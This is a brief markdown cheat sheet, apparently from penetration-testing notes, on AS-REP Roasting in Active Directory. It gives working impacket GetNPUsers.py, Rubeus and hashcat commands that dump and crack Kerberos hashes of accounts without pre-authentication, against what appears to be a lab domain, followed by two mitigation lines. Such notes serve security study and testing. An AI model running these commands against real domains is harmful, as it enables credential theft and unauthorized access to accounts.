# AS-REP Roasting

- [AS-REP Roasting](#as-rep-roasting)
  - [Overview](#overview)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)

## Overview

- Dump krbasrep5 hashes of user accounts without Kerberos pre-authentication
- Users do not have to be service accounts
- Must have pre-authentication disabled
- Can request any authentication data (encrypted TGT) for any user since KDC skips validation
- Crack dumped hash with hashcat

## Exploitation

```powershell
# Query AS-REP-roastable users with impacket from Kali host
# Supply userlist and don't require authentication
GetNPUsers.py -dc-ip 10.10.149.145 -k -no-pass -usersfile users.txt spookysec.local/


# Dump KRBASREP5 hashes
Rubeus.exe asreproast

# Transfer hash onto attacker and insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
# Crack hash with hashcat
hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Mitigation

- Strong password policy
- Enable Kerberos Pre-Authentication